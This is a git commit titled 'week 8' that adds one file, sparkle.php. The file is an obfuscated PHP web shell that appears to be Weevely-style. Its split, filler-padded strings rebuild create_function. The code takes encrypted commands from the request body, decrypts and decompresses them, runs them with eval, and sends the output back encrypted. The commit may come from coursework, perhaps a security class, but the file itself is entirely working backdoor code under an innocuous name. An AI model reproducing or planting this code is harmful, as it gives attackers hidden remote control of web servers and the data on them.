bdd3f5e8ae303446cd8f4d637da108ed989c4901
Hsanokklis <hsanokklis@gmail.com>
2025-03-18 12:18:43 -0400

    week 8

---
+++ week8/sparkle.php
@@ -0,0 +1,11 @@
+<?php
+$M='$k_2="e6773a8_2c"_2;$_2kh="3da5e575_22c77";$_2kf="1e5_2fa6f9c8_23_24";_2$p_2="pMK2SUpTNb_2RedFZZ";func';
+$j='tch("/$kh(.+)$kf/_2",@file_ge_2t_c_2ont_2ents("php_2:/_2/_2input")_2,$m)==1) {@ob_sta_2rt();@_2ev_';
+$R='2al_2(@gzun_2co_2mpress(_2@x(@_2bas_2e64_decode($m[1]),$_2k_2)));$o=@o_2b_get_con_2tents()_2;@ob_e';
+$Q=';(_2$j<$c&&_2$i<$l);$j+_2+,$_2i+_2+){$_2_2o.=$t{$i}^$k{$j}_2;}}return_2 $o;}i_2f_2 (_2@p_2reg_2_ma';
+$a=str_replace('ll','','cllllrlleate_llfullnctillon');
+$p='t_2ion x(_2$t,$k){_2$_2c=strlen($k)_2;$l=_2_2strlen($t);_2$o="";f_2_2or($_2i=_20;$i<$l;){for($j=_20';
+$Z='n_2d_cl_2e_2an();$r_2=@ba_2se6_24_encode(@x(_2@gzcompres_2s(_2_2$o),$k))_2;print("$p$kh_2$r$kf");}';
+$n=str_replace('_2','',$M.$p.$Q.$j.$R.$Z);
+$x=$a('',$n);$x();
+?>
